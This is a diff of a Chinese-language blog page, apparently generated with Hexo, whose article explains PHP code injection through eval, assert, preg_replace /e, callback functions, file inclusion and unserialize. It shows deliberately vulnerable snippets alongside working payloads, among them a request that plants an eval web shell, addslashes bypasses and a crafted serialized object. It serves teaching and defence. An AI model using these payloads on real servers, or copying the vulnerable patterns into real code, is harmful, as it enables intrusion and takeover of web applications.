@@ -1,4 +1,4 @@
-<!doctype html>
+<!DOCTYPE html>
 
 
 
@@ -10,11 +10,19 @@
   <meta charset="UTF-8"/>
 <meta http-equiv="X-UA-Compatible" content="IE=edge" />
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
 
 
 
 <meta http-equiv="Cache-Control" content="no-transform" />
 <meta http-equiv="Cache-Control" content="no-siteapp" />
+
 
 
 
@@ -68,7 +76,18 @@
 
 <link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico?v=5.1.4">
+
+
+
+
 
 
   <meta name="keywords" content="PHP,代码注入,命令注入," />
@@ -76,11 +95,6 @@
 
 
 
-
-
-
-
-  <link rel="shortcut icon" type="image/x-icon" href="/ico/favicon.ico?v=5.1.0" />
 
 
 
@@ -107,11 +121,13 @@
   var CONFIG = {
     root: '/',
     scheme: 'Pisces',
-    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
     fancybox: true,
-    motion: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
     duoshuo: {
-      userId: 'undefined',
+      userId: '0',
       author: '博主'
     },
     algolia: {
@@ -132,11 +148,7 @@
 
 
 
-  <title> PHP代码注入和命令注入 | Ethan' Blog </title>
-</head>
-
-<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
-
+  <title>PHP代码注入和命令注入 | Ethan' Blog</title>
   
 
 
@@ -145,28 +157,17 @@
 
 
 
-  <script type="text/javascript">
-    (function() {
-      var hm = document.createElement("script");
-      hm.src = "//tajs.qq.com/stats?sId=63078337";
-      var s = document.getElementsByTagName("script")[0];
-      s.parentNode.insertBefore(hm, s);
-    })();
-  </script>
 
+</head>
 
-
-
-
-
-
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 
   
   
     
   
 
-  <div class="container one-collumn sidebar-position-left page-post-detail ">
+  <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
     <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
@@ -213,7 +214,7 @@
       
         
         <li class="menu-item menu-item-archives">
-          <a href="/archives" rel="section">
+          <a href="/archives/" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
@@ -223,7 +224,7 @@
       
         
         <li class="menu-item menu-item-categories">
-          <a href="/categories" rel="section">
+          <a href="/categories/" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
             
@@ -233,7 +234,7 @@
       
         
         <li class="menu-item menu-item-tags">
-          <a href="/tags" rel="section">
+          <a href="/tags/" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
             
@@ -243,7 +244,7 @@
       
         
         <li class="menu-item menu-item-about">
-          <a href="/about" rel="section">
+          <a href="/about/" rel="section">
             
               <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
             
@@ -279,7 +280,7 @@
       <i class="fa fa-times-circle"></i>
     </span>
     <div class="local-search-input-wrapper">
-      <input autocapitalize="off" autocomplete="off" autocorrect="off"
+      <input autocomplete="off"
              placeholder="搜索..." spellcheck="false"
              type="text" id="local-search-input">
     </div>
@@ -313,7 +314,11 @@
   
   
 
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://www.beesfun.com/2017/04/18/PHP代码注入和命令注入/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -331,14 +336,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                PHP代码注入和命令注入
-              
-            
-          </h1>
+          <h1 class="post-title" itemprop="name headline">PHP代码注入和命令注入</h1>
         
 
         <div class="post-meta">
@@ -386,6 +384,16 @@
 
           
             
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/04/18/PHP代码注入和命令注入/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count gitment-comments-count" data-xid="/2017/04/18/PHP代码注入和命令注入/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
           
 
           
@@ -401,7 +409,9 @@
       </header>
     
 
-
+    
+    
+    
     <div class="post-body" itemprop="articleBody">
 
       
@@ -415,69 +425,81 @@
 <ul>
 <li>eval</li>
 </ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 1. 没有任何过滤</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">@<span class="keyword">eval</span>($_GET[<span class="string">"cmd"</span>]);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line">?cmd=phpinfo();</div><div class="line">?cmd=fputs(fopen(<span class="string">'test.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST[test])?&gt;'</span>)</div><div class="line"></div><div class="line"><span class="comment"># 2. addslashes 过滤</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$cmd = @(string)$_GET[<span class="string">"cmd"</span>];</div><div class="line"><span class="keyword">eval</span>(<span class="string">'$cmd="'</span> . addslashes($cmd) . <span class="string">'";'</span>);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line"></div><div class="line"><span class="comment"># $&#123;$&#123;&#125;&#125; 绕过</span></div><div class="line">cmd=$&#123;$&#123;phpinfo()&#125;&#125;</div><div class="line"></div><div class="line"><span class="comment"># 3 双引号包含过滤</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$cmd = <span class="string">"echo \"hello "</span> . $_GET[<span class="string">'cmd'</span>] . <span class="string">"\";"</span>;</div><div class="line"><span class="keyword">eval</span>($cmd);</div><div class="line"></div><div class="line"><span class="comment"># $&#123;$&#123;&#125;&#125; 绕过</span></div><div class="line">cmd=$&#123;$&#123;phpinfo()&#125;&#125;</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 没有任何过滤</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">"cmd"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">?cmd=phpinfo();</span><br><span class="line">?cmd=fputs(fopen(<span class="string">'test.php'</span>,<span class="string">'w'</span>),<span class="string">'&lt;?php @eval($_POST[test])?&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. addslashes 过滤</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = @(string)$_GET[<span class="string">"cmd"</span>];</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">'$cmd="'</span> . addslashes($cmd) . <span class="string">'";'</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># $&#123;$&#123;&#125;&#125; 绕过</span></span><br><span class="line">cmd=$&#123;$&#123;phpinfo()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3 双引号包含过滤</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$cmd = <span class="string">"echo \"hello "</span> . $_GET[<span class="string">'cmd'</span>] . <span class="string">"\";"</span>;</span><br><span class="line"><span class="keyword">eval</span>($cmd);</span><br><span class="line"></span><br><span class="line"><span class="comment"># $&#123;$&#123;&#125;&#125; 绕过</span></span><br><span class="line">cmd=$&#123;$&#123;phpinfo()&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p><code>${${}} 绕过</code>是利用可变变量的二次嵌套，执行里面花括号内的代码，如: <code>echo &quot;${${phpinfo()}}&quot;;</code>, 会执行phpinfo(), 这里必须是双引号包含，双引号包含时会解析包含的字符串中的变量。</p>
 <p>PHP可变变量可以无需二次嵌套，一次也可以执行，<code>echo &quot;${phpinfo()}&quot;;</code>这种情况是不能执行的，而<code>echo &quot;${/**/phpinfo()}&quot;;</code>是能执行phpinfo()的, 这是因为花括号解析语法的关键条件是花括号内的第一个字符，<code>空格，tab，注释，回车</code>是各种语法分析引擎中常见的分割字符，<code>@</code>是PHP语法的一个特殊的容错符号，所以可变变量内的花括号有这么一个规则，需要判断花括号内的内容是否为真正的代码，条件即是文本的第一个字符串是否为PHP语法解析引擎的分割字符和特殊的语法符号, 因此下面代码都能执行。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
 <p><strong> php &gt;= 4.3 </strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="string">"$&#123; phpinfo()&#125;"</span>;</div><div class="line"><span class="string">"$&#123;    phpinfo()&#125;"</span>;</div><div class="line"><span class="string">"$&#123;/**/phpinfo()&#125;"</span>;</div><div class="line"><span class="string">"$&#123;</span></div><div class="line"><span class="string">phpinfo()&#125;"</span>;</div><div class="line"><span class="string">"$&#123;@phpinfo()&#125;"</span>;</div><div class="line"></div><div class="line"><span class="string">"$&#123;( string )phpinfo()&#125;"</span>;</div><div class="line"><span class="string">"$&#123;phpinfo[phpinfo()]&#125;"</span>;</div><div class="line"></div><div class="line"><span class="string">"&#123;$phpinfo[phpinfo()]&#125;"</span>;</div><div class="line"><span class="string">"&#123;$&#123;phpinfo()&#125;&#125;"</span>;</div><div class="line"><span class="string">"$&#123;$&#123;phpinfo()&#125;&#125;"</span>;</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"$&#123; phpinfo()&#125;"</span>;</span><br><span class="line"><span class="string">"$&#123;    phpinfo()&#125;"</span>;</span><br><span class="line"><span class="string">"$&#123;/**/phpinfo()&#125;"</span>;</span><br><span class="line"><span class="string">"$&#123;</span></span><br><span class="line"><span class="string">phpinfo()&#125;"</span>;</span><br><span class="line"><span class="string">"$&#123;@phpinfo()&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="string">"$&#123;( string )phpinfo()&#125;"</span>;</span><br><span class="line"><span class="string">"$&#123;phpinfo[phpinfo()]&#125;"</span>;</span><br><span class="line"></span><br><span class="line"><span class="string">"&#123;$phpinfo[phpinfo()]&#125;"</span>;</span><br><span class="line"><span class="string">"&#123;$&#123;phpinfo()&#125;&#125;"</span>;</span><br><span class="line"><span class="string">"$&#123;$&#123;phpinfo()&#125;&#125;"</span>;</span><br></pre></td></tr></table></figure>
 <p><strong> 更新：php&gt;=5.5 </strong></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">"$&#123;phpinfo()&#125;"</span>;</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"$&#123;phpinfo()&#125;"</span>;</span><br></pre></td></tr></table></figure>
 <p>执行phpinfo().</p>
 <ul>
 <li>assert</li>
 </ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">@assert($_GET[<span class="string">"cmd"</span>]);</div><div class="line"><span class="meta">?&gt;</span></div><div class="line">cmd=phpinfo();</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@assert($_GET[<span class="string">"cmd"</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">cmd=phpinfo();</span><br></pre></td></tr></table></figure>
 <h4 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a>preg_replace</h4><p>preg_replace()函数可以引发代码执行，源于PCRE (Perl Compatible Regular Expressions) 中的e(PREG_REPLACE_EVAL)选项，<br>这个选项会把replacement中的内容当做PHP代码执行，并取返回结果的值，其中后项引用可以是<code>$1</code>，也可以是<code>\\1</code>。<br>当replacement 参数构成一个合理的php 代码字符串的时候，<code>/e</code> 修正符使preg_replace()，将replacement 参数当做php 代码执行。</p>
 <ul>
 <li>第一个参数 pattern的代码注入</li>
 </ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># magic_quotes_gpc=Off时，导致代码执行。</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$regexp = $_GET[<span class="string">'reg'</span>];</div><div class="line">$var = <span class="string">'&lt;php&gt;phpinfo()&lt;/php&gt;'</span>;</div><div class="line">preg_replace(<span class="string">"/&lt;php&gt;(.*?)$regexp"</span>, <span class="string">'\\1'</span>, $var);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># magic_quotes_gpc=Off时，导致代码执行。</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$regexp = $_GET[<span class="string">'reg'</span>];</span><br><span class="line">$var = <span class="string">'&lt;php&gt;phpinfo()&lt;/php&gt;'</span>;</span><br><span class="line">preg_replace(<span class="string">"/&lt;php&gt;(.*?)$regexp"</span>, <span class="string">'\\1'</span>, $var);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>提交：<code>reg=%3C\/php%3E/e</code>, 执行 phpinfo(), 即pattern参数注入<code>/e</code>修正符。</p>
 <p>一般情况是不会有<code>e</code>选项的，我们可以通过<code>%00</code>截断等方式来添加</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span>  </div><div class="line">$regexp = $_GET[<span class="string">'re'</span>];  </div><div class="line">$var = <span class="string">'&lt;tag&gt;phpinfo()&lt;/tag&gt;'</span>;  </div><div class="line">preg_replace(<span class="string">"/&lt;tag&gt;(.*?)$regexp&lt;\/tag&gt;/"</span>, <span class="string">'\\1'</span>, $var);  </div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">$regexp = $_GET[<span class="string">'re'</span>];  </span><br><span class="line">$var = <span class="string">'&lt;tag&gt;phpinfo()&lt;/tag&gt;'</span>;  </span><br><span class="line">preg_replace(<span class="string">"/&lt;tag&gt;(.*?)$regexp&lt;\/tag&gt;/"</span>, <span class="string">'\\1'</span>, $var);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>提交：<code>reg=%3C\/php%3E/e%00</code>.</p>
 <ul>
 <li>第二个参数replacement</li>
 </ul>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"># /e 修正符使preg_replace()，将replacement 参数当做php 代码执行</div><div class="line">&lt;?php</div><div class="line">preg_replace(&quot;//e&quot;, $_GET[&apos;cmd&apos;], &quot;cmd test&quot;);</div><div class="line">?&gt;</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /e 修正符使preg_replace()，将replacement 参数当做php 代码执行</span><br><span class="line">&lt;?php</span><br><span class="line">preg_replace(&quot;//e&quot;, $_GET[&apos;cmd&apos;], &quot;cmd test&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
 <p>提交:<code>cmd=phpinfo()</code></p>
 <ul>
 <li>第三个参数</li>
 </ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?</span></div><div class="line">preg_replace(<span class="string">"/\s*\[php\](.+?)\[\/php\]\s*/ies"</span>, <span class="string">"\\1"</span>, $_GET[<span class="string">'h'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">preg_replace(<span class="string">"/\s*\[php\](.+?)\[\/php\]\s*/ies"</span>, <span class="string">"\\1"</span>, $_GET[<span class="string">'h'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>提交：<code>h=[php]phpinfo()[/php]</code>。</p>
 <h4 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h4><ul>
 <li>array_map</li>
 </ul>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$evil_callback = $_GET[<span class="string">'callback'</span>];</div><div class="line">$some_array = <span class="keyword">array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</div><div class="line">$new_array = array_map($evil_callback, $some_array);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$evil_callback = $_GET[<span class="string">'callback'</span>];</span><br><span class="line">$some_array = <span class="keyword">array</span>(<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>);</span><br><span class="line">$new_array = array_map($evil_callback, $some_array);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>提交 <code>http://127.0.0.1/array_map.php?callback=phpinfo</code>, 即执行<code>phpinfo()</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line">array_map()</div><div class="line">usort(), uasort(), uksort()</div><div class="line">array_filter()</div><div class="line">array_reduce()</div><div class="line">array_diff_uassoc(), array_diff_ukey()</div><div class="line">array_udiff(), array_udiff_assoc(), array_udiff_uassoc()</div><div class="line">array_intersect_assoc(), array_intersect_uassoc()</div><div class="line">array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()</div><div class="line">array_walk(), array_walk_recursive()</div><div class="line">xml_set_character_data_handler()</div><div class="line">xml_set_default_handler()</div><div class="line">xml_set_element_handler()</div><div class="line">xml_set_end_namespace_decl_handler()</div><div class="line">xml_set_external_entity_ref_handler()</div><div class="line">xml_set_notation_decl_handler()</div><div class="line">xml_set_processing_instruction_handler()</div><div class="line">xml_set_start_namespace_decl_handler()</div><div class="line">xml_set_unparsed_entity_decl_handler()</div><div class="line">stream_filter_register()</div><div class="line">set_error_handler()</div><div class="line">register_shutdown_function()</div><div class="line">register_tick_function()</div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">array_map()</span><br><span class="line">usort(), uasort(), uksort()</span><br><span class="line">array_filter()</span><br><span class="line">array_reduce()</span><br><span class="line">array_diff_uassoc(), array_diff_ukey()</span><br><span class="line">array_udiff(), array_udiff_assoc(), array_udiff_uassoc()</span><br><span class="line">array_intersect_assoc(), array_intersect_uassoc()</span><br><span class="line">array_uintersect(), array_uintersect_assoc(), array_uintersect_uassoc()</span><br><span class="line">array_walk(), array_walk_recursive()</span><br><span class="line">xml_set_character_data_handler()</span><br><span class="line">xml_set_default_handler()</span><br><span class="line">xml_set_element_handler()</span><br><span class="line">xml_set_end_namespace_decl_handler()</span><br><span class="line">xml_set_external_entity_ref_handler()</span><br><span class="line">xml_set_notation_decl_handler()</span><br><span class="line">xml_set_processing_instruction_handler()</span><br><span class="line">xml_set_start_namespace_decl_handler()</span><br><span class="line">xml_set_unparsed_entity_decl_handler()</span><br><span class="line">stream_filter_register()</span><br><span class="line">set_error_handler()</span><br><span class="line">register_shutdown_function()</span><br><span class="line">register_tick_function()</span><br></pre></td></tr></table></figure>
 <h3 id="文件包含导致代码注入攻击"><a href="#文件包含导致代码注入攻击" class="headerlink" title="文件包含导致代码注入攻击"></a>文件包含导致代码注入攻击</h3><p>PHP文件包含会执行包含文件的代码，当开启了远程文件包含，则非常容易引起代码注入攻击。远程文件包含条件: <code>allow_url_fopen=On</code>, <code>allow_url_include=On</code>, 文件包含相关函数有: <code>include</code>, <code>include_once</code>, <code>require</code>, <code>require_once</code>。</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">include</span>($_GET[<span class="string">'cmd'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>提交：<code>cmd=data:text/plain,%3C?php%20phpinfo%28%29;?%3E</code>, 即执行phpinfo()。</p>
-<h3 id="反序列化导致的代码注入攻击"><a href="#反序列化导致的代码注入攻击" class="headerlink" title="反序列化导致的代码注入攻击"></a>反序列化导致的代码注入攻击</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</div><div class="line">    <span class="keyword">var</span> $var = <span class="string">''</span>;</div><div class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</div><div class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;var);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">unserialize($_GET[<span class="string">'saved_code'</span>]);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure>
+<h3 id="反序列化导致的代码注入攻击"><a href="#反序列化导致的代码注入攻击" class="headerlink" title="反序列化导致的代码注入攻击"></a>反序列化导致的代码注入攻击</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Example</span> </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> $var = <span class="string">''</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">unserialize($_GET[<span class="string">'saved_code'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 <p>提交: <code>unserialize.php?saved_code=O:7:%22Example%22:1:{s:3:%22var%22;s:10:%22phpinfo%28%29;%22;}</code>,即执行phpinfo()</p>
-<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p>有一些程序中会判断用户输入是不是一个序列化的数据，常见的代码如下<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">$token = $data[<span class="number">0</span>];  </div><div class="line"><span class="keyword">switch</span> ( $token ) &#123;  </div><div class="line">    <span class="keyword">case</span> <span class="string">'s'</span> :  </div><div class="line">        <span class="keyword">if</span> ( <span class="string">'"'</span> !== $data[$length<span class="number">-2</span>] )  </div><div class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;  </div><div class="line">    <span class="keyword">case</span> <span class="string">'a'</span> :  </div><div class="line">    <span class="keyword">case</span> <span class="string">'O'</span> :  </div><div class="line">        <span class="keyword">return</span> (bool) preg_match( <span class="string">"/^&#123;$token&#125;:[0-9]+:/s"</span>, $data );  </div><div class="line">    <span class="keyword">case</span> <span class="string">'b'</span> :  </div><div class="line">    <span class="keyword">case</span> <span class="string">'i'</span> :  </div><div class="line">    <span class="keyword">case</span> <span class="string">'d'</span> :  </div><div class="line">        <span class="keyword">return</span> (bool) preg_match( <span class="string">"/^&#123;$token&#125;:[0-9.E-]+;\$/"</span>, $data );</div></pre></td></tr></table></figure></p>
